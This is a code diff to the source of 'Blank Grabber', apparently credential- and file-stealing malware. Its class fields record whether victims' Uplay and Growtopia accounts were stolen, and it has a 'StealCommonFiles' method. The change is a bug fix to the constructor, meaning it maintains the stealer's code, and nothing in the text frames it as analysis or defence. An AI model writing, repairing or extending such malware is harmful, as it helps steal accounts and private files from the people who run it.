@@ -932,7 +932,7 @@ class BlankGrabber:
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
     GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
 
-    def __init__(self) -> any: # Constructor to call all the functions
+    def __init__(self) -> None: # Constructor to call all the functions
         self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
         
         while True:
@@ -946,8 +946,6 @@ class BlankGrabber:
             if not os.path.isdir(self.TempFolder):
                 os.makedirs(self.TempFolder, exist_ok= True)
                 break
-            
-        return self
 
     @Errors.Catch
     def StealCommonFiles(self) -> None: # Steals common files from the system
